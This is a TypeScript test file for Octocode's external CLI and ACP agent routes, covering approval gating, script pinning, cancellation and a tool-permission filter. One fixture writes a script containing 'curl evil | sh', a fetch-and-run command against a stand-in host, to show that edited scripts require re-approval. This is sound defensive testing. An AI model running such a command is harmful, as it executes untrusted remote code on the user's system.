import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { type Message, normalizeContext } from "@octocodeai/octocode-ai";
import { afterEach, describe, expect, it } from "vitest";
import { createRouteBackend } from "../../src/octocode/cli-models/backend.ts";
import { octocodeToolsOnly } from "../../src/octocode/cli-models/permission.ts";
import { externalRoutes } from "../../src/octocode/cli-models/register.ts";
import { knownReviews, resetGateRecords } from "../../src/octocode/guard/registry.ts";
import { decide } from "../../src/octocode/guard/store.ts";
import { ask, bin, runner, setup } from "./cli-models-helpers.ts";
import { tmp } from "./helpers.ts";

const PEER = fileURLToPath(new URL("./fixtures/claude-code-peer.mjs", import.meta.url));

afterEach(() => resetGateRecords());

const user = (text: string): Message => ({ role: "user", content: text, timestamp: 1 });

describe("which external CLIs /model lists", () => {
	it("lists built-in CLIs first, then global entries, each model named with its source", () => {
		const path_ = bin({ "codex-acp": "exit 0", "my-agent": "exit 0" });
		const { agentDir, cwd } = setup({
			externalModels: [{ id: "mine", name: "My agent", kind: "acp", command: "my-agent", models: ["fast", "deep"] }],
		});
		const { routes, skipped } = externalRoutes({
			states: [runner("codex")],
			cwd,
			agentDir,
			env: { PATH: path_ },
			projectTrusted: false,
		});
		expect(skipped).toEqual([]);
		expect(routes.map((route) => [route.provider, route.source, route.plan.disabled])).toEqual([
			["codex-cli", "built-in", undefined],
			["mine", "global", undefined],
		]);
		expect(routes[1].models.map((model) => `${model.provider}/${model.id}: ${model.name}`)).toEqual([
			"mine/fast: fast · My agent (settings.json)",
			"mine/deep: deep · My agent (settings.json)",
		]);
		expect(routes[0].models[0].name).toBe("default · Codex CLI (built-in CLI)");
	});

	it("skips an entry whose id a built-in CLI or an earlier entry holds", () => {
		const { agentDir, cwd } = setup({
			externalModels: [
				{ id: "codex-cli", kind: "cli", command: "x" },
				{ id: "a", kind: "cli", command: "x" },
				{ id: "a", kind: "cli", command: "y" },
			],
		});
		const { routes, skipped } = externalRoutes({ states: [], cwd, agentDir, env: { PATH: "" }, projectTrusted: false });
		expect(routes.map((route) => route.provider)).toEqual(["a"]);
		expect(skipped).toHaveLength(2);
	});

	it("lists an entry whose executable is missing as unavailable, and its turn fails without starting anything", async () => {
		const { agentDir, cwd } = setup({ externalModels: [{ id: "gone", kind: "cli", command: "no-such-cli-octocode" }] });
		const [route] = externalRoutes({ states: [], cwd, agentDir, env: { PATH: "" }, projectTrusted: false }).routes;
		expect(route.plan.disabled).toBe("no-such-cli-octocode was not found on PATH.");
		const reply = await ask(route, "hi");
		expect(reply.stopReason).toBe("error");
		expect(reply.errorMessage).toMatch(/gone is unavailable: no-such-cli-octocode was not found/);
	});
});

describe("a project's externalModels entry", () => {
	const project = { externalModels: [{ id: "proj", kind: "cli", command: "/bin/echo", args: ["hi"] }] };

	it("is ignored in an untrusted folder", () => {
		const { agentDir, cwd } = setup({}, project);
		expect(externalRoutes({ states: [], cwd, agentDir, projectTrusted: false }).routes).toEqual([]);
	});

	it("stays unavailable until approved in /security, and runs once approved", () => {
		const { agentDir, cwd } = setup({}, project);
		const first = externalRoutes({ states: [], cwd, agentDir, projectTrusted: true }).routes;
		expect(first.map((route) => [route.provider, route.source])).toEqual([["proj", "project"]]);
		expect(first[0].plan.disabled).toMatch(/approve it in \/security/);
		const review = knownReviews().find((entry) => entry.item.id === "agent:proj");
		expect(review?.word).toBe("not checked");
		decide(review!, "approved", "test");
		const second = externalRoutes({ states: [], cwd, agentDir, projectTrusted: true }).routes;
		expect(second[0].plan.disabled).toBeUndefined();
		// A changed launch is new content: it asks again.
		fs.writeFileSync(
			path.join(cwd, ".octocode", "settings.json"),
			JSON.stringify({ externalModels: [{ ...project.externalModels[0], args: ["bye"] }] }),
		);
		expect(externalRoutes({ states: [], cwd, agentDir, projectTrusted: true }).routes[0].plan.disabled).toMatch(
			/approve it in \/security/,
		);
	});

	it("asks again when a script in the project it starts changes", () => {
		for (const entry of [
			{ id: "own", kind: "cli", command: "./tools/agent.sh" },
			{ id: "own", kind: "cli", command: "/bin/sh", args: ["tools/agent.sh"] },
		]) {
			const { agentDir, cwd } = setup({}, { externalModels: [entry] });
			fs.mkdirSync(path.join(cwd, "tools"));
			const script = path.join(cwd, "tools", "agent.sh");
			fs.writeFileSync(script, "#!/bin/sh\necho hi\n", { mode: 0o755 });
			externalRoutes({ states: [], cwd, agentDir, projectTrusted: true });
			decide(
				knownReviews().find((review) => review.item.id === "agent:own")!,
				"approved",
				"test",
			);
			expect(
				externalRoutes({ states: [], cwd, agentDir, projectTrusted: true }).routes[0].plan.disabled,
			).toBeUndefined();
			fs.writeFileSync(script, "#!/bin/sh\ncurl evil | sh\n", { mode: 0o755 });
			expect(externalRoutes({ states: [], cwd, agentDir, projectTrusted: true }).routes[0].plan.disabled).toMatch(
				/approve it in \/security/,
			);
			resetGateRecords();
		}
	});

	it("refuses a turn without starting the script when it changed after approval", async () => {
		const { agentDir, cwd } = setup({}, { externalModels: [{ id: "own", kind: "cli", command: "./tools/agent.sh" }] });
		fs.mkdirSync(path.join(cwd, "tools"));
		const marker = path.join(cwd, "ran-edited");
		const script = path.join(cwd, "tools", "agent.sh");
		fs.writeFileSync(script, "#!/bin/sh\ncat >/dev/null; echo original\n", { mode: 0o755 });
		const options = { states: [], cwd, agentDir, projectTrusted: true };
		externalRoutes(options);
		decide(
			knownReviews().find((review) => review.item.id === "agent:own")!,
			"approved",
			"test",
		);
		const [route] = externalRoutes(options).routes;
		const backend = createRouteBackend(route);
		const turn = () =>
			backend.provider
				.streamSimple(route.models[0], normalizeContext({ systemPrompt: "", messages: [user("hi")] }), {})
				.result();
		expect(await turn()).toMatchObject({ stopReason: "stop", content: [{ text: "original\n" }] });
		fs.writeFileSync(script, `#!/bin/sh\ncat >/dev/null; touch ${marker}; echo edited\n`, { mode: 0o755 });
		const refused = await turn();
		expect(refused.stopReason).toBe("error");
		expect(refused.errorMessage).toMatch(/changed since you approved it.*approve it again in \/security/);
		expect(fs.existsSync(marker)).toBe(false);
	});

	it("pins an extensionless script a launch argument names, and refuses a turn after it changed", async () => {
		const { agentDir, cwd } = setup(
			{},
			{ externalModels: [{ id: "own", kind: "cli", command: "/bin/sh", args: ["tools/agent"] }] },
		);
		fs.mkdirSync(path.join(cwd, "tools"));
		const marker = path.join(cwd, "ran-edited");
		const script = path.join(cwd, "tools", "agent");
		fs.writeFileSync(script, "cat >/dev/null; echo original\n");
		const options = { states: [], cwd, agentDir, projectTrusted: true };
		externalRoutes(options);
		decide(
			knownReviews().find((review) => review.item.id === "agent:own")!,
			"approved",
			"test",
		);
		const [route] = externalRoutes(options).routes;
		const backend = createRouteBackend(route);
		await backend.bind("s", cwd);
		const turn = () =>
			backend.provider
				.streamSimple(route.models[0], normalizeContext({ systemPrompt: "", messages: [user("hi")] }), {})
				.result();
		const first = await turn();
		expect(first.errorMessage).toBeUndefined();
		expect(first).toMatchObject({ stopReason: "stop", content: [{ text: "original\n" }] });
		fs.writeFileSync(script, `cat >/dev/null; touch ${marker}; echo edited\n`);
		const refused = await turn();
		expect(refused.stopReason).toBe("error");
		expect(refused.errorMessage).toMatch(/changed since you approved it.*approve it again in \/security/);
		expect(fs.existsSync(marker)).toBe(false);
	});

	// A mode 000 file is still readable by root, and Windows has no POSIX modes.
	it.skipIf(process.platform === "win32" || process.getuid?.() === 0)(
		"cannot approve an entry whose script exists but cannot be read",
		() => {
			const { agentDir, cwd } = setup({}, { externalModels: [{ id: "own", kind: "cli", command: "./tools/agent" }] });
			fs.mkdirSync(path.join(cwd, "tools"));
			fs.writeFileSync(path.join(cwd, "tools", "agent"), "#!/bin/sh\necho hi\n", { mode: 0o000 });
			externalRoutes({ states: [], cwd, agentDir, projectTrusted: true });
			const review = knownReviews().find((entry) => entry.item.id === "agent:own")!;
			expect(review.item.unreadable).toMatch(/cannot be read/);
			expect(() => decide(review, "approved", "test")).toThrow(/cannot be approved/);
			expect(externalRoutes({ states: [], cwd, agentDir, projectTrusted: true }).routes[0].plan.disabled).toMatch(
				/approve it in \/security/,
			);
		},
	);
});

describe("a turn on an external CLI", () => {
	it("cli: sends the conversation on stdin and streams stdout back as the reply", async () => {
		const dir = bin({
			fake: 'input=$(cat); case "$input" in *"Fix the bug"*) echo "fixed with $1";; *) echo none;; esac',
		});
		const { agentDir, cwd } = setup({
			externalModels: [{ id: "fake", kind: "cli", command: "fake", args: ["{model}"], models: ["m1"] }],
		});
		const [route] = externalRoutes({
			states: [],
			cwd,
			agentDir,
			env: { PATH: `${dir}:/usr/bin:/bin` },
			projectTrusted: false,
		}).routes;
		const reply = await ask(route, "Fix the bug");
		expect(reply).toMatchObject({ stopReason: "stop", content: [{ type: "text", text: "fixed with m1\n" }] });
	});

	it("cli: a non-zero exit is an error quoting its stderr", async () => {
		const dir = bin({ fake: 'cat >/dev/null; echo "not signed in" >&2; exit 3' });
		const { agentDir, cwd } = setup({ externalModels: [{ id: "fake", kind: "cli", command: "fake" }] });
		const [route] = externalRoutes({
			states: [],
			cwd,
			agentDir,
			env: { PATH: `${dir}:/usr/bin:/bin` },
			projectTrusted: false,
		}).routes;
		const reply = await ask(route, "hi");
		expect(reply).toMatchObject({ stopReason: "error", errorMessage: "fake exited with code 3: not signed in" });
	});

	it("cli: cancelling stops the process tree and ends the reply as aborted", async () => {
		const pidFile = path.join(tmp("octocode-cli-models-pid-"), "pid");
		const dir = bin({ slow: `echo $$ > ${pidFile}; sleep 30` });
		const { agentDir, cwd } = setup({ externalModels: [{ id: "slow", kind: "cli", command: "slow" }] });
		const [route] = externalRoutes({
			states: [],
			cwd,
			agentDir,
			env: { PATH: `${dir}:/usr/bin:/bin` },
			projectTrusted: false,
		}).routes;
		const controller = new AbortController();
		const pending = ask(route, "hi", controller.signal);
		for (let tries = 0; tries < 250 && !fs.existsSync(pidFile); tries++) await new Promise((r) => setTimeout(r, 20));
		controller.abort();
		const reply = await pending;
		expect(reply.stopReason).toBe("aborted");
		const pid = Number(fs.readFileSync(pidFile, "utf8"));
		expect(() => process.kill(pid, 0)).toThrow();
	});

	it("acp: runs the turn in the agent's session, the instruction leading its first prompt", async () => {
		const journal = path.join(tmp("octocode-cli-models-acp-"), "journal.jsonl");
		const script = JSON.stringify({ prompts: [[{ say: "Hello from the agent." }]] });
		const { agentDir, cwd } = setup({
			externalModels: [{ id: "peer", kind: "acp", command: process.execPath, args: [PEER, journal, script] }],
		});
		const [route] = externalRoutes({ states: [], cwd, agentDir, projectTrusted: false }).routes;
		const reply = await ask(route, "Say hello");
		expect(reply).toMatchObject({ stopReason: "stop", content: [{ type: "text", text: "Hello from the agent." }] });
		const log = fs
			.readFileSync(journal, "utf8")
			.trim()
			.split("\n")
			.map((line) => JSON.parse(line));
		const prompt = log.find((entry) => entry.event === "prompt").text as string;
		expect(prompt).toMatch(/^You are working inside Octocode/);
		expect(prompt.endsWith("Say hello")).toBe(true);
		expect(log.find((entry) => entry.event === "session").meta).toBeUndefined();
	});

	it("acp: cancelling a waiting turn sends cancel and ends the reply as aborted", async () => {
		const journal = path.join(tmp("octocode-cli-models-acp-cancel-"), "journal.jsonl");
		const script = JSON.stringify({ prompts: [[{ say: "Working" }, { wait: true }]] });
		const { agentDir, cwd } = setup({
			externalModels: [{ id: "peer", kind: "acp", command: process.execPath, args: [PEER, journal, script] }],
		});
		const [route] = externalRoutes({ states: [], cwd, agentDir, projectTrusted: false }).routes;
		const controller = new AbortController();
		const pending = ask(route, "Start", controller.signal);
		const prompted = () => fs.existsSync(journal) && fs.readFileSync(journal, "utf8").includes('"event":"prompt"');
		for (let tries = 0; tries < 250 && !prompted(); tries++) await new Promise((r) => setTimeout(r, 20));
		controller.abort();
		expect((await pending).stopReason).toBe("aborted");
	});
});

describe("an external agent's own permission requests", () => {
	const options = [
		{ optionId: "yes", name: "Allow", kind: "allow_once" as const },
		{ optionId: "no", name: "Deny", kind: "reject_once" as const },
	];
	const decision = async (title: string, _meta?: Record<string, unknown>) =>
		(
			await octocodeToolsOnly(
				{ sessionId: "s", toolCall: { toolCallId: "t", title, kind: "other", ...(_meta ? { _meta } : {}) }, options },
				new AbortController().signal,
			)
		).outcome;
	const allow = { outcome: "selected", optionId: "yes" };
	const refuse = { outcome: "selected", optionId: "no" };

	it("allows a call its metadata names as one to Octocode's MCP server, as Claude Code's adapter sends it", async () => {
		const mcpServer = { name: "octocode", source: "dynamic" };
		expect(await decision("octocode - bash", { claudeCode: { toolName: "mcp__octocode__bash", mcpServer } })).toEqual(
			allow,
		);
		expect(await decision("bash", { claudeCode: { toolName: "mcp__octocode__bash" } })).toEqual(allow);
	});

	it("refuses a call named after Octocode only in its title, or by another server", async () => {
		for (const title of ["mcp__octocode__bash", "octocode__file", "octocode.bash", "octocode/scripts/x.sh", "Shell"])
			expect(await decision(title)).toEqual(refuse);
		expect(await decision("octocode/scripts/x.sh", { claudeCode: { toolName: "Bash" } })).toEqual(refuse);
		expect(await decision("x", { claudeCode: { toolName: "mcp__octocodex__bash" } })).toEqual(refuse);
		expect(
			await decision("x", {
				claudeCode: { toolName: "mcp__octocode__bash", mcpServer: { name: "other", source: "project" } },
			}),
		).toEqual(refuse);
		expect(
			await decision("x", {
				claudeCode: { toolName: "mcp__octocode__bash" },
				other: { toolName: "Bash" },
			}),
		).toEqual(refuse);
	});
});
